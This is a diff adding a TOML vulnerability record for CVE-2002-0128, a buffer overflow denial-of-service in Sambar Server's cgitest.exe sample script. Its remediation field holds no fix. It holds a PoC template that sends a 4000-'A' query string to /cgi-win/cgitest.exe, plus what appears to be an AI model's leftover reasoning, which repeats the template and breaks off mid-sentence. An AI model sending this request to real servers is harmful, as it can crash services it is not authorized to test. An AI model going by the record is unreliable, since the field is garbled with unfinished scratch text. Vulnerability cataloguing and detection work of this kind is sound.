@@ -1,0 +1,118 @@
+[basic]
+description = "Sambar Server 5.1 Beta 4之前版本中的cgitest.exe示例脚本存在缓冲区溢出漏洞。远程攻击者无需任何认证，可通过向该脚本发送超长参数触发缓冲区溢出，导致服务器拒绝服务，在特定条件下可能执行任意代码。该漏洞影响Sambar Server 5.1 Beta 4之前的所有版本，CVSS评分7.5，危害等级高。"
+published = "2002-03-25T05:00:00.000"
+remediation = '''
+[info]
+id = "POC-AVE-2002-00128"
+name = "CVE-2002-0128 PoC"
+author = "AVE"
+severity = "high"
+tags = ["cve-2002-0128"]
+description = "Sambar Server 5.1 cgitest.exe 示例脚本远程拒绝服务漏洞检测。通过发送超长参数触发缓冲区溢出导致服务崩溃。"
+vuln_id = ["CVE-2002-0128", "AVE-2002-00128"]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+protocol = "http"
+method = "GET"
+path = "/cgi-win/cgitest.exe?{{repeat(\"A\", 4000)}}"
+headers = { "User-Agent" = "AVE/1.0", "Host" = "{{Hostname}}" }
+
+[poc.requests.matchers]
+type = "status"
+status = [200]
+expect = true
+```
+
+Wait, I need to think about the PoC more carefully. The exploit sends 5 requests with 4000 'A's. The PoC should be a safe verification. Let me use a simpler approach - just send a long argument and check if the server crashes (connection reset/refused after).
+
+Actually, for a PoC, I should keep it simple and safe. Let me use a reasonable approach.
+
+For the EXP - the exploit code is publicly available on ExploitDB. It's a C program that sends 5 requests with 4000 'A's. I could write an EXP TOML, but the skill says "EXP = 完整利用，仅当网上有明确利用方法时生成". The ExploitDB entry is a DoS exploit, not a full RCE. So I'll mark it as NO_EXP or provide a DoS EXP.
+
+Actually, looking at the exploit code more carefully, it's a DoS exploit (crasher), not a full RCE exploit. The NVD description says "possibly execute arbitrary code" but this hasn't been confirmed. So I'll provide a PoC and mark EXP as not available.
+
+Let me finalize the PoC. The exploit sends:
+```
+GET /cgi-win/cgitest.exe?AAAA...AAAA HTTP/1.1
+host: localhost
+```
+
+With 4000 'A's, repeated 5 times.
+
+For the PoC TOML, I'll use a simpler approach. Let me use the `repeat` function or just a long path.
+
+Actually, looking at the Nuclei template format, I should use a format that's compatible. Let me use a raw approach or a simple GET with a long query string.
+
+Let me write the PoC with a reasonable approach:
+
+```toml
+[info]
+id = "POC-AVE-2002-00128"
+name = "CVE-2002-0128 PoC"
+author = "AVE"
+severity = "high"
+tags = ["cve-2002-0128"]
+description = "Sambar Server 5.1 cgitest.exe 示例脚本远程拒绝服务漏洞检测。通过发送超长参数触发缓冲区溢出导致服务崩溃。"
+vuln_id = ["CVE-2002-0128", "AVE-2002-00128"]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+protocol = "http"
+method = "GET"
+path = "/cgi-win/cgitest.exe?{{repeat(\"A\", 4000)}}"
+headers = { "User-Agent" = "AVE/1.0" }
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+```
+
+Hmm, but the `repeat` function might not be standard in Nuclei. Let me use a simpler approach. Actually, looking at the Nuclei docs, they do support `repeat` function. But let me keep it simple.
+
+Actually, I think for this PoC, since the exploit sends a very long string, I should use a raw HTTP request or just note that the PoC sends a long argument. Let me use a simpler path with a reasonable number of characters.
+
+Let me reconsider. The PoC should be functional. Let me use a raw TCP approach since the original exploit uses raw sockets:
+'''
+score = 7.5
+severity = "HIGH"
+sources = ["exploitdb"]
+title = "Sambar Server 5.1 cgitest.exe 拒绝服务漏洞"
+updated = "2026-06-16T21:56:51.060"
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["CVE-2002-0128"]
+ave_id = "AVE-2002-0174"
+
+[meta]
+collected_at = "2026-07-28T00:00:00Z"
+status = "completed"
+
+[references]
+urls = [
+    "http://www.der-keiler.de/Mailing-Lists/securityfocus/bugtraq/2002-02/0083.html",
+    "http://www.iss.net/security_center/static/7894.php",
+    "http://www.sambar.com/security.htm",
+    "http://www.securityfocus.com/archive/1/250545",
+    "http://www.securityfocus.com/bid/3885",
+    "https://www.exploit-db.com/exploits/21228",
+    "https://github.com/CVEProject/cvelistV5/blob/0118bdf83d51e7ec6262ccd7acc694cb751b5bf8/cves/2002/0xxx/CVE-2002-0128.json",
+    "https://github.com/Patrowl/PatrowlHearsData/blob/d2f32d8750bd50219425137a8fc56ab841cc707b/CVE/data/2002/CVE-2002-0128.json",
+    "https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2002/CVE-2002-0128",
+    "https://github.com/nomi-sec/NVD-Database/blob/23dc120c34402aaa65883c51c1d03b3cb02c20cb/2002/CVE-2002-0128.json",
+    "https://github.com/olbat/nvdcve/blob/add906b6a8ba20fd533c6fdd7f023c73e6090f3a/nvdcve/CVE-2002-0128.json",
+    "https://github.com/opencve/opencve-kb/blob/878a3042444029b151459a1565a690101509a27a/2002/CVE-2002-0128.json",
+    "https://github.com/HORKimhab/poc-cve-collection/blob/c8205feda508d733c873e4904e8ec7780820d9e3/2002/0xxx/CVE-2002-0128.md",
+    "https://github.com/fkie-cad/nvd-json-data-feeds/blob/3e38e95f2e1dd1607b843a3c921eb524d7c4f47f/CVE-2002/CVE-2002-01xx/CVE-2002-0128.json",
+    "https://github.com/CyberSecAI/cve_info/blob/03b7e36424574a3a9ba5fd13480a326b666a1046/2002/0xxx/CVE-2002-0128.json",
+    "https://github.com/yarencheng/cve-devops-playground/blob/c54e59752dddfc9aa36c13774164384cfa0d1f04/content/CVE-2002-0128.md",
+]
